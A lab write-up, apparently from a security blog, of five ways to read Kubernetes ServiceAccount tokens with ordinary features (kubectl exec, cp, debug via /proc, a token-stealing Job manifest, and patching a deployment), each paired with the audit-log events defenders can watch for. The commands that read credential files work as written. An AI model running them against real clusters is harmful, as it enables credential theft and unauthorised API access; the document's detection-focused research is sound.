# Different Ways ServiceAccount Tokens Can Be Read or Stolen in Kubernetes

This write-up documents **five practical ways attackers can obtain Kubernetes ServiceAccount (SA) tokens** using legitimate Kubernetes features.

No kernel exploits.  
No container escapes.  
No Kubernetes CVEs.

Just permissions, defaults, and visibility gaps.

All techniques were reproduced in a controlled lab to understand what actually appears in Kubernetes audit logs.

---

## Why This Matters

In most real Kubernetes breaches, attackers don’t exploit Kubernetes first.

They usually:

1. Compromise a pod  
2. Discover a ServiceAccount token  
3. Use it to access the Kubernetes API  
4. Enumerate permissions, pods, secrets, and nodes  

ServiceAccount tokens are **high-value credentials** — often long-lived and implicitly trusted.

---

## 1. Reading Tokens via kubectl exec

If an attacker can exec into a pod, they can read any file inside the container — including tokens.

```bash
kubectl exec -n honeypot file-backup -- cat /opt/backup/token
```
![Screenshot](images/image%20%2813%29.png)

## Why this works
- kubectl exec is commonly allowed for debugging
- Tokens are just files on disk

### Audit log signal
- verb: get
- subresource: exec
- Command arguments include cat and a token path

```yaml
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Request",
  "auditID": "4c879b68-ef59-4df9-87a4-2112a7d99bc1",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/honeypot/pods/file-backup/exec?command=cat&command=%2Fopt%2Fbackup%2Ftoken&container=backup&stderr=true&stdout=true",
  "verb": "get"
  }
```

![Screenshot](images/image%20%2817%29.png)


## 2. Stealing ServiceAccount Tokens Using `kubectl cp`

`kubectl cp` is commonly viewed as a harmless utility for copying files in and out of containers.  
Internally, however, it relies on **`kubectl exec` + `tar`**, which makes it a viable technique for stealing ServiceAccount tokens.

---

### Attack Scenario

If an attacker has permission to:
- access a namespace
- and use `kubectl cp` on a pod

they can copy any readable file from inside the container — including ServiceAccount tokens.

Example:

```bash
kubectl cp honeypot/file-backup:/opt/backup/..data/token ./backup-sa-token
```
## Why this is dangerous
- Appears as a normal file copy
- No explicit “read secret” API call is made

### Audit log signal
- exec requests.
- Commands containing tar cf

```yaml
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Request",
  "auditID": "e875d2e7-9c25-4f16-8034-e443f7bc869a",
  "stage": "ResponseStarted",
  "requestURI": "/api/v1/namespaces/honeypot/pods/file-backup/exec?command=tar&command=cf&command=-&command=%2Fopt%2Fbackup%2F..data%2Ftoken&container=backup&stderr=true&stdout=true",
  "verb": "get",
  },
  "sourceIPs": [
    "192.168.144.187"
  ],
  "userAgent": "kubectl/v1.34.1 (linux/amd64) kubernetes/93248f9",
  "objectRef": {
    "resource": "pods",
    "namespace": "honeypot",
    "name": "file-backup",
    "apiVersion": "v1",
    "subresource": "exec"
  },
  "responseStatus": {
    "metadata": {},
    "code": 101
  }
}
```
![Screenshot](images/image%20%2816%29.png)

---

## 3. Reading ServiceAccount Tokens via kubectl debug and /proc
Kubernetes allows operators to attach **ephemeral debug containers** to a running pod using `kubectl debug`.
While intended for troubleshooting, this feature can be abused to **read files from another container’s filesystem**, including **ServiceAccount tokens**.



### Attack Scenario
- An attacker has permission to create ephemeral containers in a namespace.
- They attach a debug container to an existing pod that already has a ServiceAccount token mounted.

---

### Attach a Debug Container to the Target Pod

```bash
kubectl debug -n honeypot pod/file-backup \
  --image=busybox \
  --target=backup \
  -it
```
Inside the debug container:
```bash
cat /proc/1/root/opt/backup/token
```
![Screenshot](images/image%20%2822%29.png)

## Why this works

- No need to exec into the original container.
- Reads files directly from the container’s root filesystem

### Audit log signal
- create on pods/ephemeralcontainers
- Followed by filesystem access
```yaml
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Request",
  "auditID": "dbb1fcd5-5fe8-4358-aabd-06a362403dbd",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/honeypot/pods/file-backup/ephemeralcontainers",
  "verb": "patch",
  "sourceIPs": [
    "192.168.121.230"
  ],
  "userAgent": "kubectl/v1.34.1 (linux/amd64) kubernetes/93248f9",
  "objectRef": {
    "resource": "pods",
    "namespace": "honeypot",
    "name": "file-backup",
    "apiVersion": "v1",
    "subresource": "ephemeralcontainers"
  },
  "responseStatus": {
    "metadata": {},
    "code": 200
  },
  "requestObject": {
    "spec": {
      "ephemeralContainers": [
        {
          "image": "busybox",
          "name": "debugger-wdvdl",
          "resources": {},
          "stdin": true,
          "targetContainerName": "backup",
          "terminationMessagePolicy": "File",
          "tty": true
        }
      ]
    }
}
```
---

## 4. Creating a Pod or Job Using a Target ServiceAccount

If an attacker has permissions to create pods, jobs, or other workloads in a namespace, they can **attach an existing ServiceAccount** and read its token from inside the container.
This does **not** require access to Secrets or ServiceAccount objects directly.

---

## Stealing a Token Using a Job

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: token-job
  namespace: honeypot
spec:
  template:
    spec:
      serviceAccountName: backup-sa
      restartPolicy: Never
      containers:
      - name: steal
        image: busybox
        command:
        - sh
        - -c
        - cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Why this is common
- Pod creation permissions are often broad
- Token access happens entirely inside the pod

### Audit log signal
- create on pods or jobs
- Token usage appears only when API calls are made
![Screenshot](images/image%20%2824%29.png)
![Screenshot](images/image%20%2818%29.png)

---

## 5. Patching Existing Workloads to Swap ServiceAccounts

If an attacker has permission to patch workloads, they can change which ServiceAccount a running application uses and obtain its token after the pod restarts.

```bash
kubectl patch deployment backup -n honeypot \
  -p '{"spec":{"template":{"spec":{"serviceAccountName":"backup-sa"}}}}'
```
![Screenshot](images/image%20%2821%29.png).

Once the pod restarts, the token is mounted automatically.

## Why this is subtle
- No new workload created directly.
- Looks like a routine configuration change.

### Audit log signal
- Patch on deployments
- Followed by pod recreation with a new ServiceAccount

---

## What All These Techniques Have in Common
- No Kubernetes vulnerabilities required
- All actions are RBAC-allowed
- Tokens are accessed as normal files
- Detection relies entirely on audit visibility

## Defender Takeaway
- If you are not monitoring:
 pods/exec
- pods/ephemeralcontainers
- workload creation
- ServiceAccount changes

Then ServiceAccount token abuse will look like normal cluster activity.

## Disclaimer

This content is for research and learning purposes only.
All techniques were tested in an isolated lab environment.
